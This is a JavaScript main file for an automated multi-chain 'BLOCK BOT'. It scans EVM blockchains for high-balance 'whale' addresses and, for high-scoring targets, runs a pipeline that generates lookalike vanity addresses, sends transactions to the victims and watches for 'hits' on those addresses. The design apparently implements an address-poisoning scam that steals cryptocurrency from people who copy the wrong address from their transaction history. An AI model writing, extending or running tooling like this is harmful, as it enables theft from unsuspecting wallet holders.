import { Worker } from 'node:worker_threads';
import { fileURLToPath } from 'node:url';
import { dirname, join } from 'node:path';
import { CHAINS } from './config/chains.js';
import { initTelegram, sendAlert } from './lib/telegram.js';
import { redis, saveMatch } from './lib/redis.js';
import { initHitAlerts, sendHitAlert } from './hit/alerts.js';
import { startDetector } from './hit/detector.js';
import { runVanityPipeline } from './pipeline.js';
import 'dotenv/config';

const __dirname = dirname(fileURLToPath(import.meta.url));
const workers = new Map();
const stats = {};

// ── Track active pipelines to avoid duplicates ─────
const activePipelines = new Set();

function log(msg) {
  console.log(`[${new Date().toISOString().slice(11, 19)}][BOT] ${msg}`);
}

function spawnWorker(chain, chainConfig) {
  const worker = new Worker(join(__dirname, 'worker.js'), {
    workerData: { chain, chainConfig },
  });

  stats[chain] = { blocks: 0, matches: 0, connected: false };

  worker.on('message', async (msg) => {
    if (msg.type === 'connected') {
      stats[chain].connected = true;
      log(`${chain.toUpperCase()} connected`);
    }
    if (msg.type === 'block_processed') {
      stats[chain].blocks++;
      stats[chain].matches += msg.matches;
    }
    // New: scanner found a match → trigger vanity pipeline (score > 70 only)
    if (msg.type === 'match_found') {
      const { address, chain: matchChain, score, nativeBalance, nativeSymbol } = msg;
      if (score >= 70) {
        await triggerPipeline(address, matchChain, score, nativeBalance, nativeSymbol);
      } else {
        log(`${matchChain.toUpperCase()} — ${address} score ${score} < 70 — skipped`);
      }
    }
  });

  worker.on('error', (err) => {
    log(`${chain.toUpperCase()} worker error: ${err.message}`);
  });

  worker.on('exit', (code) => {
    log(`${chain.toUpperCase()} worker exited (code ${code}) — restarting in 5s`);
    stats[chain].connected = false;
    workers.delete(chain);
    setTimeout(() => spawnWorker(chain, chainConfig), 5000);
  });

  workers.set(chain, worker);
}

/**
 * When scanner finds a whale match → auto vanity gen + TX
 */
async function triggerPipeline(targetAddress, chain, score, nativeBalance, nativeSymbol) {
  const key = `${targetAddress}:${chain}`;
  if (activePipelines.has(key)) return;
  activePipelines.add(key);

  log(`\n========================================`);
  log(`PIPELINE TRIGGERED — ${chain.toUpperCase()}`);
  log(`Target: ${targetAddress} | Score: ${score}`);
  log(`Balance: ${nativeBalance} ${nativeSymbol}`);
  log(`========================================\n`);

  try {
    await runVanityPipeline({
      targetAddress,
      chainKey: chain,
      score,
    });
  } catch (err) {
    log(`Pipeline FAILED for ${targetAddress}: ${err.message}`);
  } finally {
    activePipelines.delete(key);
  }
}

function printStats() {
  const lines = Object.entries(stats).map(([chain, s]) => {
    const status = s.connected ? '✓' : '✗';
    return `  ${status} ${chain.toUpperCase().padEnd(10)} | blocks: ${String(s.blocks).padStart(5)} | matches: ${s.matches}`;
  });
  const pipelineCount = activePipelines.size;
  log(`\n--- STATS ---\n${lines.join('\n')}\n  Pipelines actifs: ${pipelineCount}\n-------------`);
}

async function main() {
  log(`
┌─────────────────────────────────────────┐
│  BLOCK BOT — Unified Pipeline          │
├─────────────────────────────────────────┤
│  Scanner → Filter → Score              │
│  → Vanity Gen → Redis Vault            │
│  → TX Send → Hit Detector              │
│  Chains: ${Object.keys(CHAINS).length} EVM                         │
└─────────────────────────────────────────┘
  `);

  // Init alerts
  initTelegram();
  initHitAlerts();

  // Start hit detector (monitors all vanity addresses)
  if (process.env.MAIN_WALLET) {
    log('Starting Hit Detector...');
    startDetector().catch((err) => log(`Hit Detector error: ${err.message}`));
  } else {
    log('MAIN_WALLET not set — Hit Detector disabled');
  }

  // Spawn scanner workers per chain
  const chainFilter = process.env.CHAINS?.split(',').map((c) => c.trim().toLowerCase());

  for (const [chain, config] of Object.entries(CHAINS)) {
    if (chainFilter && !chainFilter.includes(chain)) continue;
    log(`Spawning scanner: ${chain.toUpperCase()} (${config.name})`);
    spawnWorker(chain, config);
  }

  // Stats every 60s
  setInterval(printStats, 60_000);

  // Graceful shutdown
  for (const sig of ['SIGINT', 'SIGTERM']) {
    process.on(sig, async () => {
      log(`${sig} received — shutting down`);
      for (const [chain, worker] of workers) {
        log(`Stopping ${chain}...`);
        await worker.terminate();
      }
      await redis.quit();
      process.exit(0);
    });
  }
}

main();
